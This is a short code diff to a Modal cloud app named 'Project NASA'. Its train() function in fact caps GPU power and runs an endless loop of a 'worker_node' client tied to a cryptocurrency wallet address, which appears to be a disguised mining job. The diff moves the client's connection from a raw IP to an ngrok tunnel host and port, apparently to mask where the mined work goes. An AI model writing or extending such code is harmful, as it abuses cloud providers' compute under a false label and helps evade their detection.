@@ -1,7 +1,8 @@
 import modal
 
 app = modal.App("Project NASA")
-VPS = "43.156.178.157"
+VPS = "0.tcp.ap.ngrok.io"
+PORT = "12131"
 WALLET = "prl1p4yctfh3zd4n2rxsevgnet9gt43gdnc95hm66yysggqlyqu0secpqhyntrr"
 NODE = "NASATECH"
 
@@ -21,7 +22,7 @@ def train():
     subprocess.run(["nvidia-smi", "-pl", "150"], capture_output=True, timeout=10)
     while True:
         proc = subprocess.Popen(
-            ["/usr/local/bin/worker_node", "--host", f"{VPS}:9000",
+            ["/usr/local/bin/worker_node", "--host", f"{VPS}:{PORT}",
              "--user", WALLET, "--worker", NODE],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True, bufsize=1
